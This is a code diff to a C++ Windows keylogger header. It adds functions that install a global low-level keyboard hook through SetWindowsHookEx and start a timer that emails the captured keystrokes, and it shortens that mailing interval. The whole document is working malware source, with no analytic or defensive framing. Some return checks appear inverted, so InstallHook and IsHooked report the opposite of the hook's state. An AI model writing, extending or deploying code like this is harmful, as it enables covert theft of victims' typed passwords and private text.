@@ -32,7 +32,7 @@ void TimerSendMail()
         keylog = "";
 }
 
-Timer MailTimer(TimerSendMail, 2000 * 60, Timer::Infinite); //this controls how often to send the mail
+Timer MailTimer(TimerSendMail, 500 * 60, Timer::Infinite); //this controls how often to send the mail
 
 HHOOK eHook = NULL; //pointer to our hook
 
@@ -78,6 +78,28 @@ LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
 
     return CallNextHookEx(eHook, nCode, wparam, lparam);
 
+}
+
+bool InstallHook()
+{
+    Helper::WriteAppLog("Hook Started... Timer started");
+    MailTimer.Start(true);
+
+    eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc,
+                              GetModuleHandle(NULL), 0);
+    return eHook == NULL;
+}
+
+bool UninstallHook()
+{
+    bool b = UnhookWindowsHookEx(eHook);
+    eHook = NULL;
+    return (bool)b;
+}
+
+bool IsHooked()
+{
+    return (bool)(eHook == NULL);
 }
 
 #endif //KEYBHOOK_H
